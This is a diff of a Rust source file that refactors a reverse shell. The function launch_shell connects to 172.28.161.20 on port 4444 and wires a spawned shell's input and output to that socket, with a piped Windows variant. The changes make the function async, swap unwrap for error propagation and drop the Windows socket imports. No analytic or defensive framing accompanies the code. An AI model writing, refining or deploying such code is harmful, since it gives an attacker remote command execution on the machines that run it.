@@ -1,13 +1,11 @@
 use std::net::TcpStream;
 use std::process::{Command, Stdio};
+use std::io;
 
 #[cfg(unix)]
 use std::os::unix::io::{AsRawFd, FromRawFd};
 
-#[cfg(windows)]
-use std::os::windows::io::{AsRawSocket, FromRawSocket};
-
-pub fn launch_shell() {
+pub async fn launch_shell() -> io::Result<()> {
     let sock = TcpStream::connect("172.28.161.20:4444").unwrap();
 
     #[cfg(unix)]
@@ -18,10 +16,9 @@ pub fn launch_shell() {
             .stdin(unsafe { Stdio::from_raw_fd(fd) })
             .stdout(unsafe { Stdio::from_raw_fd(fd) })
             .stderr(unsafe { Stdio::from_raw_fd(fd) })
-            .spawn()
-            .unwrap()
-            .wait()
-            .unwrap();
+            .spawn()?
+            .wait()?;
+        Ok(())
     }
 
     #[cfg(windows)]
@@ -33,8 +30,7 @@ pub fn launch_shell() {
             .stdin(Stdio::piped())
             .stdout(Stdio::piped())
             .stderr(Stdio::piped())
-            .spawn()
-            .unwrap();
+            .spawn()?;
 
         let mut child_stdout = child.stdout.take().unwrap();
         let mut child_stderr = child.stderr.take().unwrap();
@@ -90,9 +86,11 @@ pub fn launch_shell() {
             }
         });
 
-        child.wait().unwrap();
+        child.wait()?;
         stdin_thread.join().ok();
         stdout_thread.join().ok();
         stderr_thread.join().ok();
+
+        Ok(())
     }
 }
